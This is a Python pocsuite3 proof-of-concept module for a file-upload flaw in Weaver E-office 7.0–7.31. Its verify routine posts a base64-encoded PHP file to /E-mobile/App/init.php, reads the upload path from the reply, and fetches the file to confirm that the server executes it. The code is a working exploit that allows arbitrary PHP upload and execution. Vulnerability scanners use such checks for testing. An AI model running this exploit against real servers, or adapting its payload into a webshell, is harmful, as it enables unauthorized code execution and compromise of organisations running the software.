from pocsuite3.api import Output, POCBase, register_poc, requests, logger, VUL_TYPE, POC_CATEGORY, OptDict
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from collections import OrderedDict
import re

class TestPOC(POCBase):
    vulID = '000'  # ssvid
    version = '1.0'
    name = '泛微 E-office FlowCommon.class.php存在文件上传漏洞'
    appName = '泛微 E-office'
    appVersion = '7.0~7.31'
    vulType = VUL_TYPE.CODE_EXECUTION
    desc = '''上海泛微网络科技股份有限公司 E-office /E-mobile/App/Flow/Common/common/FlowCommon.class.php 存在文件上传漏洞,攻击者可利用该漏洞获取系统敏感信息等。'''
    samples = []
    install_requires = ['']
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _verify(self):
        result = {}
        filename = "test123.php"
        headers = {"Content-Type": "application/x-www-form-urlencoded "}
        path = "/E-mobile/App/init.php"
        vul_url = self.url+path
        data = "m=common_Common_Flow&f=flowDo&diff=feedback&RUN_ID=1&USER_ID=1&CONTENT=1&FLOW_ID=1&upload_file=PD9waHAgZWNobyAiMTIzNDU2NzgiO3VubGluayhfX0ZJTEVfXyk7Pz4=&file_name=" + filename
        resp = requests.post(vul_url, verify=False, data = data, headers = headers,allow_redirects=False, timeout=10)
        if resp.status_code == 200 and "flag" in resp.text and filename in resp.text and '"url":' in resp.text and "?diff=" in resp.text:
            path1 = re.search(r',"url":"(.*?)\?diff=',resp.text).group(1).replace("\\","")
            vul_url1 = self.url+path1
            resp1 = requests.get(vul_url1, verify=False, headers = headers,allow_redirects=False, timeout=10)
            if resp1.status_code == 200 and "12345678" in resp1.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = vul_url
                result['VerifyInfo']['Content'] = vul_url1
        return self.parse_output(result)

    def parse_output(self,result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
register_poc(TestPOC)
